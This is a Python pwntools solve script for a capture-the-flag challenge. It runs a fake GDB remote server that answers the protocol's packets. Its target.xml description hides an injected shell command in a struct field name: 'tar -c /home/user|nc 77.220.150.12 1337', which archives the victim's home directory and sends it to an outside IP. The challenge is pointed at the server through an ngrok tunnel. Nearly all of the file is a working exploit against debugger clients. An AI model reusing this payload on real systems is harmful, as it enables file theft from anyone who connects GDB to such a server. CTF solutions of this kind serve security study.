#!/usr/bin/env python3
import re
from socketserver import TCPServer, BaseRequestHandler

from pwn import *


def connect():
    return remote("solve-all.challs.m0lecon.it", 4040)
    return remote("localhost", 4040)


def pow(tube):
    tube.recvuntil(b"\nhashcash ")
    hc_opts, hc_resource = tube.recvline().decode().strip().split()
    assert hc_opts == "-mCb24"
    (hc_resource,) = re.match('^"([0-9a-zA-Z]+)"$', hc_resource).groups()
    result = (
        subprocess.check_output(["hashcash", hc_opts, hc_resource]).decode().strip()
    )
    tube.sendlineafter(b"Result: ", result.encode())


TARGET_XML = b"""<?xml version="1.0"?>
<!DOCTYPE target SYSTEM "gdb-target.dtd">
<target>
    <architecture>i386:x86-64</architecture>
    <feature name="org.gnu.gdb.i386.core">
        <reg name="rax" bitsize="64" type="int64" regnum="0"/>
        <reg name="rbx" bitsize="64" type="int64"/>
        <reg name="rcx" bitsize="64" type="int64"/>
        <reg name="rdx" bitsize="64" type="int64"/>
        <reg name="rsi" bitsize="64" type="int64"/>
        <reg name="rdi" bitsize="64" type="int64"/>
        <reg name="rbp" bitsize="64" type="data_ptr"/>
        <reg name="rsp" bitsize="64" type="data_ptr"/>
        <reg name="r8" bitsize="64" type="int64"/>
        <reg name="r9" bitsize="64" type="int64"/>
        <reg name="r10" bitsize="64" type="int64"/>
        <reg name="r11" bitsize="64" type="int64"/>
        <reg name="r12" bitsize="64" type="int64"/>
        <reg name="r13" bitsize="64" type="int64"/>
        <reg name="r14" bitsize="64" type="int64"/>
        <reg name="r15" bitsize="64" type="int64"/>
        <reg name="rip" bitsize="64" type="code_ptr"/>
        <reg name="eflags" bitsize="32" type="int32"/>
        <reg name="cs" bitsize="32" type="int32"/>
        <reg name="ss" bitsize="32" type="int32"/>
        <reg name="ds" bitsize="32" type="int32"/>
        <reg name="es" bitsize="32" type="int32"/>
        <reg name="fs" bitsize="32" type="int32"/>
        <reg name="gs" bitsize="32" type="int32"/>
        <reg name="st0" bitsize="80" type="i387_ext"/>
        <reg name="st1" bitsize="80" type="i387_ext"/>
        <reg name="st2" bitsize="80" type="i387_ext"/>
        <reg name="st3" bitsize="80" type="i387_ext"/>
        <reg name="st4" bitsize="80" type="i387_ext"/>
        <reg name="st5" bitsize="80" type="i387_ext"/>
        <reg name="st6" bitsize="80" type="i387_ext"/>
        <reg name="st7" bitsize="80" type="i387_ext"/>
        <reg name="fctrl" bitsize="32" type="int" group="float"/>
        <reg name="fstat" bitsize="32" type="int" group="float"/>
        <reg name="ftag" bitsize="32" type="int" group="float"/>
        <reg name="fiseg" bitsize="32" type="int" group="float"/>
        <reg name="fioff" bitsize="32" type="int" group="float"/>
        <reg name="foseg" bitsize="32" type="int" group="float"/>
        <reg name="fooff" bitsize="32" type="int" group="float"/>
        <reg name="fop" bitsize="32" type="int" group="float"/>
        <struct id="pwn" size="8">
            <field name="q[}\x04_shell(&quot;tar -c /home/user|nc 77.220.150.12 1337&quot;)]" start="0" end="1"/>
            <field name="q" start="1" end="63"/>
        </struct>
        <reg name="pwn" bitsize="64" type="pwn"/>
    </feature>
</target>
"""


class MyGDBHandler(BaseRequestHandler):
    def __send_packet(self, packet):
        xsum = sum(packet) % 256
        reply = b"$" + packet + b"#" + f"{xsum:02x}".encode()
        print(reply)
        self.request.send(reply)

    def handle(self):
        while True:
            c = self.request.recv(1)
            assert c != b"-", "Retransmission is not implemented"
            if c == b"+":
                continue
            if c == b"$":
                packet = bytearray()
                while True:
                    c = self.request.recv(1)
                    if c == b"#":
                        break
                    packet.append(ord(c))
                xsum = int(self.request.recv(2), 16)
                print((packet, hex(xsum)))
                assert sum(packet) % 256 == xsum
                self.request.send(b"+")
                if packet.startswith(b"qSupported:"):
                    # Advertise file transfer support
                    self.__send_packet(b"PacketSize=1000;qXfer:features:read+")
                elif packet == b"vCont?":
                    # Advertise only "continue" support
                    self.__send_packet(b"vCont;c")
                elif packet.startswith(b"H"):
                    # Pretend that we set a thread for subsequent operations
                    self.__send_packet(b"OK")
                elif packet.startswith(b"qXfer:features:read:target.xml:"):
                    offset, size = packet[31:].decode().split(",")
                    offset = int(offset, 16)
                    size = int(size, 16)
                    data = TARGET_XML[offset : offset + size]
                    if len(data) == 0:
                        self.__send_packet(b"l")
                    else:
                        self.__send_packet(b"m" + data)
                elif packet == b"qTStatus":
                    # Trace is not running
                    self.__send_packet(b"T0")
                elif packet == b"qTfV":
                    # No trace variables
                    self.__send_packet(b"")
                elif packet == b"?":
                    # Pretend we stopped due to a SIGSTOP
                    self.__send_packet(b"S13")
                elif packet == b"qfThreadInfo":
                    # Pretend we have only one thread with ID 1
                    self.__send_packet(b"m1")
                elif packet == b"qsThreadInfo":
                    # No more threads
                    self.__send_packet(b"l")
                elif packet == b"qAttached":
                    # Pretend we are attached to an existing process
                    self.__send_packet(b"1")
                elif packet == b"qC":
                    # Pretend that the current thread is 1
                    self.__send_packet(b"1")
                elif packet == b"g":
                    # Pretend to read register contents
                    bitsize = 0
                    for m in re.finditer(b'bitsize="(\d+)"', TARGET_XML):
                        bitsize += int(m.group(1))
                    self.__send_packet(b"00" * (bitsize // 8))
                elif packet == b"m0,1":
                    # Pretend to read memory contents
                    self.__send_packet(b"00")
                elif packet == b"qTfP":
                    # No tracepoints
                    self.__send_packet(b"")
                elif packet.startswith(b"v"):
                    # Unknown "v" packet - must return an empty string
                    self.__send_packet(b"")
                else:
                    raise RuntimeError("Unsupported packet")


class MyGDBServer(TCPServer):
    allow_reuse_address = True


def main():
    with connect() as tube:
        pow(tube)
        # ngrok tcp 1234
        server = MyGDBServer(("127.0.0.1", 1234), MyGDBHandler)
        Thread(target=server.serve_forever, daemon=True).start()
        tube.sendlineafter(b"Enter target: ", b"5.tcp.eu.ngrok.io:16743")
        while True:
            tube.recv()
        # ptm{h3ll0_s1r_y0ur_GDB_h4s_v1rus!}


if __name__ == "__main__":
    main()
